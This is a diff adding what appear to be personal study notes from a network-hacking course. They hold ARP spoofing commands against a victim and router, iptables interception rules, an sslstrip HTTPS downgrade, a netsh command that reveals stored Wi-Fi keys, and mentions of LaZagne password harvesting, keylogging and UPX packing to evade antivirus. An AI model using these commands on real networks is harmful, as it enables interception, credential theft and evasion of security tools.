@@ -1,0 +1,53 @@
+ifconfig eth0 hw ether <12digitsMacAddress> // to change mac address
+subprocess.call() //used to call OS commands
+
+//To use command line parameters
+import  optparse
+parser=optparse.OptionParser()
+parser.add_option("-i", "--interface", dest="interface", help="Interface to change MAC")
+
+result=subprocess.checkoutput() //used to get output of executed commands
+
+pythex.org // check and create regex for python
+
+netdiscover -r <ip with CIDR>
+
+
+//TODO::how to prevent ARP spoofing
+//TODO::how to prevent DNS spoofing
+//limitation is hsts
+//search for Near Field Communication (NFC) Vulnerability 
+
+apt install dsniff // for arpspoof
+arpspoof -i ens33 -t <VI> <RTR>
+arpspoof -i ens33 -t <RTR> <VI>
+sudo sysctl net.ipv4.ip_forward=1  // to enable port forwarding
+netsh interface ip delete arpcache //clear arp chache
+
+iptables -I forward -j NFQUEUE --queue-num=0  // forwarding packets to queue
+pip install netfilterqueue  // to create queue of packets in python
+scapy.ls(scapy.ARP) // to get all options provided by scapy.ARP
+
+sslstrip // used to downgrade https to http
+
+//usage
+iptables -I OUTPUT -j NFQUEUE --queue-num 0
+iptables -I INPUT -j NFQUEUE --queue-num 0
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+ 
+//show all wifi profiles 
+netsh wlan show profile Zakera key=clear
+
+LaZagne // get passwords stored in system
+
+pip install pynput  //required for monitor mouse and keyboards strikes
+
+pyinstaller // to create executatble of python files
+UPX // to hive python executatble from anti virus
+
+
+vega // to scann websites for vulnerability
+hydra //
+
+
+https://t.me/joinchat/AAAAAEHIVfpeXVuGPHqfTQ
